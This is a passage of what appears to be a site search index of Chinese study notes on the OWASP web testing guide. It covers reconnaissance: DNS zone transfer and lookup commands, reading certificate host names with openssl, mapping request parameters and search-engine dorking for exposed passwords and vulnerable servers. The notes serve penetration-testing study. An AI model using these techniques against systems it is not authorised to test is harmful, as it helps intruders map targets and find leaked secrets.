<p><code>*.example.com</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns","title":"DNS \u4f20\u9001","text":"<p>\u53d7\u5230\u9650\u5236 \u503c\u5f97\u4e00\u8bd5</p> <pre><code>$ host -t ns www.owasp.org    #\u8bc6\u522b\u540d\u79f0\u670d\u52a1\u5668\n$ host -l www.owasp.org ns1.secure.net    #\u5411\u540d\u79f0\u670d\u52a1\u5668\u8bf7\u6c42\u533a\u57df\u4f20\u9001   \n\n$ dig @dns-server -x target\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns-ptr","title":"DNS \u53cd\u5411(PTR)\u67e5\u8be2","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web-dns","title":"\u57fa\u4e8e Web \u7684 DNS \u641c\u7d22","text":"<p>Netcraft \u67e5\u8be2 DNS \u5fae\u6b65 \u67e5\u8be2 DNS</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#google-search","title":"google search","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_13","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u8bc1\u4e66\u4e0a\u7684\u901a\u7528\u540d\u79f0 (CN) \u548c\u4e3b\u9898\u5907\u7528\u540d\u79f0 (SAN) \u53ef\u80fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u540d N\u548cSAN\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u67e5\u770b\u8bc1\u4e66\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7OpenSSL\u7b49\u5176\u4ed6\u5de5\u5177\u83b7\u53d6\uff1a</p> <pre><code>$ openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#tools","title":"Tools","text":"<p>\u6c34\u6cfd nslookup\u3001dig Nessus Nikto nmap \u641c\u7d22\u5f15\u64ce</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_14","title":"\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9","text":"<p>[[\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9|\u5168\u6587]]</p> <pre><code>\u901a\u8fc7\u8bf7\u6c42\u548c\u54cd\u5e94\u5206\u6790\u786e\u5b9a\u53ef\u80fd\u7684\u5165\u53e3\u548c\u6ce8\u5165\u70b9\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5f88\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u7528\u6237\u548c\u6d4f\u89c8\u5668\u5982\u4f55\u4e0e\u4e4b\u540c\u901a\u4fe1</p> <p>\u6ce8\u610f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u9690\u85cf\u8868\u5355\u5b57\u6bb5</p> <p>\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5e94\u8be5\u8bb0\u4e0b URL\u3001\u81ea\u5b9a\u4e49\u6807\u5934\u3001\u8bf7\u6c42/\u54cd\u5e94\u6b63\u6587\u4e2d\u7684\u4efb\u4f55\u6709\u8da3\u7684\u53c2\u6570\uff0c\u5e76\u4fdd\u5b58\u5728\u7535\u5b50\u8868\u683c\u3002 \u8bf7\u6c42\u9875\u9762  \uff5c \u4ee3\u7406\u8bf7\u6c42\u7f16\u53f7 \uff5c \u6709\u8da3\u7684\u53c2\u6570 \uff5c \u8bf7\u6c42\u7c7b\u578b \uff5c</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_15","title":"\u8bf7\u6c42\u5185\u5bb9","text":"<p>\u786e\u5b9a\u5728\u4f55\u5904\u4f7f\u7528GET \u548c\u5728\u4f55\u5904\u4f7f\u7528POST \u8bc6\u522b POST \u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u53c2\u6570 \u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7279\u522b\u6ce8\u610f\u4efb\u4f55\u9690\u85cf\u53c2\u6570 \u8bc6\u522b GET \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff0c\u7279\u522b\u662f\u67e5\u8be2\u53c2\u6570 \u8bc6\u522b\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6240\u6709\u53c2\u6570 \u5728\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216 POST \u8bf7\u6c42\u4e2d\u7684\u591a\u4e2a\u53c2\u6570\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6267\u884c\u653b\u51fb\u9700\u8981\u90e8\u5206\u6216\u5168\u90e8\u53c2\u6570\u3002\u6d4b\u8bd5\u4eba\u5458\u9700\u8981\u8bc6\u522b\u6240\u6709\u53c2\u6570\uff08\u5373\u4f7f\u5df2\u7f16\u7801\u6216\u52a0\u5bc6\uff09\u5e76\u8bc6\u522b\u54ea\u4e9b\u53c2\u6570\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3002 \u8fd8\u8981\u6ce8\u610f\u901a\u5e38\u770b\u4e0d\u5230\u7684\u4efb\u4f55\u5176\u4ed6\u6216\u81ea\u5b9a\u4e49\u7c7b\u578b\u6807\u5934\uff08\u4f8b\u5982<code>debug: false</code>\uff09\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_16","title":"\u54cd\u5e94\u5185\u5bb9","text":"<ul> <li>\u786e\u5b9a\u65b0 cookie \u7684\u8bbe\u7f6e (Set-Cookie\u6807\u5934)\u3001\u4fee\u6539\u6216\u6dfb\u52a0\u4f4d\u7f6e\u3002</li> <li>\u786e\u5b9a\u5728\u6b63\u5e38\u54cd\u5e94\uff08\u5373\u672a\u4fee\u6539\u7684\u8bf7\u6c42\uff09\u671f\u95f4\u5b58\u5728\u4efb\u4f55\u91cd\u5b9a\u5411\uff083xx HTTP \u72b6\u6001\u4ee3\u7801\uff09\u3001400 \u72b6\u6001\u4ee3\u7801\uff08\u5c24\u5176\u662f 403 Forbidden\uff09\u548c 500 \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4f7f\u7528\u4efb\u4f55\u6709\u8da3\u7684\u6807\u5934\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>Server: BIG-IP</code>\u8868\u793a\u8be5\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u5e76\u4e14\u4e00\u53f0\u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4e0d\u5f97\u4e0d\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u6765\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u8d1f\u8f7d\u5e73\u8861\u7c7b\u578b\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_17","title":"\u722c\u866b","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_18","title":"\u722c\u53d6\u5e94\u7528\u6267\u884c\u8def\u5f84","text":"<p>[[\u901a\u8fc7\u5e94\u7528\u6620\u5c04\u6267\u884c\u8def\u5f84|\u5168\u6587]]</p> <pre><code>Map \u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e86\u89e3\u4e3b\u8981\u5de5\u4f5c\u6d41\u3002\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#automatic-spidering","title":"Automatic Spidering","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_19","title":"\u722c\u53d6\u5e94\u7528\u67b6\u6784","text":"<p>[[Map \u5e94\u7528\u6846\u67b6|\u5168\u6587]]</p> <pre><code>\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u548c\u4f7f\u7528\u7684\u6280\u672f\u3002\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/","title":"1.2\u5bf9\u4fe1\u606f\u6cc4\u9732\u8fdb\u884c\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fa6\u5bdf","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_1","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u8ba9\u641c\u7d22\u5f15\u64ce\u5de5\u4f5c\uff0c\u8ba1\u7b97\u673a\u7a0b\u5e8f\uff08\u6216\uff09\u5b9a\u671f\u4ece\u7f51\u7edc\u4e0a\u7684\u6570\u5341\u4ebf\u9875\u9762\u4e2d<code>robots</code>\u83b7\u53d6\u6570\u636e\uff08\u79f0\u4e3a\u722c\u884c\uff09\u3002\u8fd9\u4e9b\u7a0b\u5e8f\u901a\u8fc7\u8ddf\u8e2a\u5176\u4ed6\u9875\u9762\u7684\u94fe\u63a5\u6216\u67e5\u770b\u7ad9\u70b9\u5730\u56fe\u6765\u67e5\u627e Web \u5185\u5bb9\u548c\u529f\u80fd\u3002\u5982\u679c\u4e00\u4e2a\u7f51\u7ad9\u4f7f\u7528\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6<code>robots.txt</code>\u6765\u5217\u51fa\u5b83\u4e0d\u5e0c\u671b\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u7684\u9875\u9762\uff0c\u90a3\u4e48\u5217\u51fa\u7684\u9875\u9762\u5c06\u88ab\u5ffd\u7565\u3002\u8fd9\u662f\u4e00\u4e2a\u57fa\u672c\u6982\u8ff0 - Google \u5bf9\u641c\u7d22\u5f15\u64ce\u7684\u5de5\u4f5c\u539f\u7406\u63d0\u4f9b\u4e86\u66f4\u6df1\u5165\u7684\u89e3\u91ca\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u5bf9\u7f51\u7ad9\u548c Web \u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4fa6\u5bdf\u3002\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u548c\u4fa6\u5bdf\u6709\u76f4\u63a5\u548c\u95f4\u63a5\u7684\u8981\u7d20\uff1a\u76f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u4ece\u7f13\u5b58\u4e2d\u641c\u7d22\u7d22\u5f15\u548c\u76f8\u5173\u5185\u5bb9\uff0c\u800c\u95f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u901a\u8fc7\u641c\u7d22\u8bba\u575b\u3001\u65b0\u95fb\u7ec4\u548c\u62db\u6807\u7f51\u7ad9\u6765\u5b66\u4e60\u654f\u611f\u7684\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p> <p>\u4e00\u65e6\u641c\u7d22\u5f15\u64ce\u673a\u5668\u4eba\u5b8c\u6210\u722c\u884c\uff0c\u5b83\u5c31\u4f1a\u5f00\u59cb\u6839\u636e\u6807\u7b7e\u548c\u76f8\u5173\u5c5e\u6027\uff08\u4f8b\u5982 \uff09\u5bf9\u7f51\u9875\u5185\u5bb9\u7f16\u5236\u7d22\u5f15<code>&lt;TITLE&gt;</code>\uff0c\u4ee5\u4fbf\u8fd4\u56de\u76f8\u5173\u7684\u641c\u7d22\u7ed3\u679c\u3002\u5982\u679c<code>robots.txt</code>\u6587\u4ef6\u5728\u7f51\u7ad9\u7684\u751f\u547d\u5468\u671f\u5185\u6ca1\u6709\u66f4\u65b0\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u6307\u793a\u673a\u5668\u4eba\u4e0d\u7d22\u5f15\u5185\u5bb9\u7684\u5185\u8054 HTML \u5143\u6807\u8bb0\uff0c\u90a3\u4e48\u7d22\u5f15\u53ef\u80fd\u5305\u542b\u7f51\u7ad9\u4e0d\u6253\u7b97\u5305\u542b\u7684\u5185\u5bb9\u62e5\u6709\u8005\u3002\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528\u524d\u9762\u63d0\u5230<code>robots.txt</code>\u7684 HTML \u5143\u6807\u8bb0\u3001\u8eab\u4efd\u9a8c\u8bc1\u548c\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u5220\u9664\u6b64\u7c7b\u5185\u5bb9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u6216\u7ec4\u7ec7\u7684\u54ea\u4e9b\u654f\u611f\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u76f4\u63a5\uff08\u5728\u7ec4\u7ec7\u7684\u7f51\u7ad9\u4e0a\uff09\u6216\u95f4\u63a5\uff08\u901a\u8fc7\u7b2c\u4e09\u65b9\u670d\u52a1\uff09\u516c\u5f00\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u53ef\u80fd\u654f\u611f\u7684\u4fe1\u606f\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\uff1a</p> <ul> <li>\u7f51\u7edc\u56fe\u548c\u914d\u7f6e\uff1b</li> <li>\u7ba1\u7406\u5458\u6216\u5176\u4ed6\u4e3b\u8981\u5458\u5de5\u7684\u5b58\u6863\u5e16\u5b50\u548c\u7535\u5b50\u90ae\u4ef6\uff1b</li> <li>\u767b\u5f55\u7a0b\u5e8f\u548c\u7528\u6237\u540d\u683c\u5f0f\uff1b</li> <li>\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u79c1\u94a5\uff1b</li> <li>\u7b2c\u4e09\u65b9\u6216\u4e91\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\uff1b</li> <li>\u663e\u793a\u9519\u8bef\u4fe1\u606f\u5185\u5bb9\uff1b\u548c</li> <li>\u975e\u516c\u5171\u5e94\u7528\u7a0b\u5e8f\uff08\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u7528\u6237\u9a8c\u6536\u6d4b\u8bd5 (UAT) \u548c\u7ad9\u70b9\u7684\u6682\u5b58\u7248\u672c\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_4","title":"\u641c\u7d22\u5f15\u64ce","text":"<p>\u4e0d\u8981\u5c06\u6d4b\u8bd5\u4ec5\u9650\u4e8e\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u5546\uff0c\u56e0\u4e3a\u4e0d\u540c\u7684\u641c\u7d22\u5f15\u64ce\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u53ef\u80fd\u4f1a\u5728\u51e0\u4e2a\u65b9\u9762\u6709\u6240\u4e0d\u540c\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u5f15\u64ce\u4e0a\u6b21\u6293\u53d6\u5185\u5bb9\u7684\u65f6\u95f4\uff0c\u4ee5\u53ca\u5f15\u64ce\u7528\u6765\u786e\u5b9a\u76f8\u5173\u9875\u9762\u7684\u7b97\u6cd5\u3002\u8003\u8651\u4f7f\u7528\u4ee5\u4e0b\uff08\u6309\u5b57\u6bcd\u987a\u5e8f\u5217\u51fa\u7684\uff09\u641c\u7d22\u5f15\u64ce\uff1a</p> <ul> <li>\u767e\u5ea6\uff0c\u4e2d\u56fd\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Bing\u662f\u5fae\u8f6f\u62e5\u6709\u548c\u8fd0\u8425\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5168\u7403\u7b2c\u4e8c\u53d7\u6b22\u8fce\u3002\u652f\u6301\u9ad8\u7ea7\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li>binsearch.info\uff0c\u4e8c\u8fdb\u5236 Usenet \u65b0\u95fb\u7ec4\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Common Crawl\uff0c\u201c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u548c\u5206\u6790\u7684\u7f51\u7edc\u722c\u866b\u6570\u636e\u7684\u5f00\u653e\u5b58\u50a8\u5e93\u3002\u201d</li> <li>DuckDuckGo\u662f\u4e00\u4e2a\u4ee5\u9690\u79c1\u4e3a\u4e2d\u5fc3\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u4ee5\u4ece\u8bb8\u591a\u4e0d\u540c\u7684\u6765\u6e90\u7f16\u8bd1\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8bed\u6cd5\u3002</li> <li>Google\u63d0\u4f9b\u4e16\u754c\u4e0a\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5e76\u4f7f\u7528\u6392\u540d\u7cfb\u7edf\u5c1d\u8bd5\u8fd4\u56de\u6700\u76f8\u5173\u7684\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</li> <li>Internet Archive Wayback Machine\uff0c\u201c\u4ee5\u6570\u5b57\u5f62\u5f0f\u6784\u5efa\u4e92\u8054\u7f51\u7ad9\u70b9\u548c\u5176\u4ed6\u6587\u5316\u5236\u54c1\u7684\u6570\u5b57\u56fe\u4e66\u9986\u3002\u201d</li> <li>Shodan\uff0c\u4e00\u79cd\u7528\u4e8e\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u548c\u670d\u52a1\u7684\u670d\u52a1\u3002\u4f7f\u7528\u9009\u9879\u5305\u62ec\u6709\u9650\u7684\u514d\u8d39\u8ba1\u5212\u4ee5\u53ca\u4ed8\u8d39\u8ba2\u9605\u8ba1\u5212\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_5","title":"\u641c\u7d22\u8fd0\u7b97\u7b26","text":"<p>\u641c\u7d22\u8fd0\u7b97\u7b26\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5173\u952e\u5b57\u6216\u8bed\u6cd5\uff0c\u53ef\u6269\u5c55\u5e38\u89c4\u641c\u7d22\u67e5\u8be2\u7684\u529f\u80fd\uff0c\u5e76\u6709\u52a9\u4e8e\u83b7\u5f97\u66f4\u5177\u4f53\u7684\u7ed3\u679c\u3002\u5b83\u4eec\u901a\u5e38\u91c7\u7528<code>operator:query</code>.\u00a0\u4ee5\u4e0b\u662f\u4e00\u4e9b\u901a\u5e38\u652f\u6301\u7684\u641c\u7d22\u8fd0\u7b97\u7b26\uff1a</p> <ul> <li><code>site:</code>\u5c06\u641c\u7d22\u9650\u5236\u5728\u63d0\u4f9b\u7684\u57df\u4e2d\u3002</li> <li><code>inurl:</code>\u5c06\u53ea\u8fd4\u56de\u5728 URL \u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intitle:</code>\u53ea\u4f1a\u8fd4\u56de\u9875\u9762\u6807\u9898\u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intext:</code>\u6216\u8005<code>inbody:</code>\u53ea\u4f1a\u5728\u9875\u9762\u6b63\u6587\u4e2d\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li><code>filetype:</code>\u5c06\u4ec5\u5339\u914d\u7279\u5b9a\u6587\u4ef6\u7c7b\u578b\uff0c\u5373<code>.png</code>, \u6216<code>.php</code>.</li> </ul> <p>\u4f8b\u5982\uff0c\u8981\u67e5\u627e\u7531\u5178\u578b\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7684 owasp.org \u7684 Web \u5185\u5bb9\uff0c\u6240\u9700\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>site:owasp.org\n</code></pre> <p> \u56fe 4.1.1-1\uff1aGoogle \u7ad9\u70b9\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_6","title":"\u67e5\u770b\u7f13\u5b58\u5185\u5bb9","text":"<p>\u8981\u641c\u7d22\u4ee5\u524d\u5df2\u7f16\u5165\u7d22\u5f15\u7684\u5185\u5bb9\uff0c\u8bf7\u4f7f\u7528<code>cache:</code>\u8fd0\u7b97\u7b26\u3002\u8fd9\u6709\u52a9\u4e8e\u67e5\u770b\u81ea\u7d22\u5f15\u4ee5\u6765\u53ef\u80fd\u5df2\u66f4\u6539\u7684\u5185\u5bb9\uff0c\u6216\u8005\u53ef\u80fd\u4e0d\u518d\u53ef\u7528\u7684\u5185\u5bb9\u3002\u5e76\u975e\u6240\u6709\u641c\u7d22\u5f15\u64ce\u90fd\u63d0\u4f9b\u7f13\u5b58\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\uff1b\u5728\u64b0\u5199\u672c\u6587\u65f6\u6700\u6709\u7528\u7684\u6765\u6e90\u662f\u8c37\u6b4c\u3002</p> <p>\u8981<code>owasp.org</code>\u5728\u7f13\u5b58\u65f6\u67e5\u770b\uff0c\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>cache:owasp.org\n</code></pre> <p> \u56fe 4.1.1-2\uff1a\u8c37\u6b4c\u7f13\u5b58\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#dorking","title":"\u8c37\u6b4c\u9ed1\u5ba2\uff0c\u6216 Dorking","text":"<p>\u5f53\u4e0e\u6d4b\u8bd5\u4eba\u5458\u7684\u521b\u9020\u529b\u76f8\u7ed3\u5408\u65f6\uff0c\u4f7f\u7528\u8fd0\u7b97\u7b26\u8fdb\u884c\u641c\u7d22\u53ef\u80fd\u662f\u4e00\u79cd\u975e\u5e38\u6709\u6548\u7684\u53d1\u73b0\u6280\u672f\u3002\u53ef\u4ee5\u94fe\u63a5\u8fd0\u7b97\u7b26\u4ee5\u6709\u6548\u5730\u53d1\u73b0\u7279\u5b9a\u79cd\u7c7b\u7684\u654f\u611f\u6587\u4ef6\u548c\u4fe1\u606f\u3002\u8fd9\u79cd\u79f0\u4e3aGoogle hacking\u6216 Dorking \u7684\u6280\u672f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\uff0c\u53ea\u8981\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</p> <p>\u8bf8\u5982Google Hacking Database\u4e4b\u7c7b\u7684 dorks \u6570\u636e\u5e93\u662f\u4e00\u79cd\u6709\u7528\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5e2e\u52a9\u53d1\u73b0\u7279\u5b9a\u4fe1\u606f\u3002\u8be5\u6570\u636e\u5e93\u4e2d\u53ef\u7528\u7684\u4e00\u4e9b\u7c7b\u522b\u7684 dorks \u5305\u62ec\uff1a</p> <ul> <li>\u7acb\u8db3\u70b9</li> <li>\u5305\u542b\u7528\u6237\u540d\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u76ee\u5f55</li> <li>Web \u670d\u52a1\u5668\u68c0\u6d4b</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u6587\u4ef6</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668</li> <li>\u9519\u8bef\u4fe1\u606f</li> <li>\u5305\u542b\u591a\u6c41\u4fe1\u606f\u7684\u6587\u4ef6</li> <li>\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u7684\u5728\u7ebf\u8d2d\u7269\u4fe1\u606f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.2%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_7","title":"\u6574\u6cbb","text":"<p>\u5728\u5c06\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u53d1\u5e03\u5230\u7f51\u4e0a\u4e4b\u524d\uff0c\u8bf7\u4ed4\u7ec6\u8003\u8651\u5176\u654f\u611f\u6027\u3002</p> <p>\u5b9a\u671f\u5ba1\u67e5\u5728\u7ebf\u53d1\u5e03\u7684\u73b0\u6709\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u7684\u654f\u611f\u6027\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"1.3\u68c0\u67e5\u7f51\u7edc\u670d\u52a1\u5668\u56fe\u5143\u6587\u4ef6\u662f\u5426\u6709\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_1","title":"\u6982\u62ec","text":"<p>\u672c\u8282